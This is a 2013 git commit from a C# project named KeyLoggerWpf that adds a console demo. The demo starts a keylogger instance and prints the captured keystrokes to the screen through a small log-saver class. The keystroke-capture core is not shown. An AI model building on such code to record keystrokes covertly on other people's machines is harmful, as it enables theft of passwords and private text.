17a93c2c7624c8e67e9640c631a96a54e77d10ed
dbazylev <dbazylev@gmail.com>
2013-01-17 00:22:21 +0300

    Add console demo

---
+++ KeyLoggerWpf/TestConsole/ConsoleLogPrinter.cs
@@ -0,0 +1,14 @@
+﻿using System;
+using KeyLogger.Core.Abstract;
+
+namespace TestConsole
+{
+    class ConsoleLogPrinter: ILogSaver 
+    {
+        public bool Save(string log)
+        {
+            Console.Write(log);
+            return true;
+        }
+    }
+}
--- KeyLoggerWpf/TestConsole/Program.cs
+++ KeyLoggerWpf/TestConsole/Program.cs
@@ -1,10 +1,15 @@
-﻿namespace TestConsole
+﻿using System;
+using KeyLogger.Core;
+
+namespace TestConsole
 {
     class Program
     {
         static void Main(string[] args)
         {
-
+            KeyLoggerInstance keyLogger = new KeyLoggerInstance(new KeyCheker(), new ConsoleLogPrinter(), 10, 900);
+            keyLogger.Start();
+            Console.ReadLine();
         }
         
     }
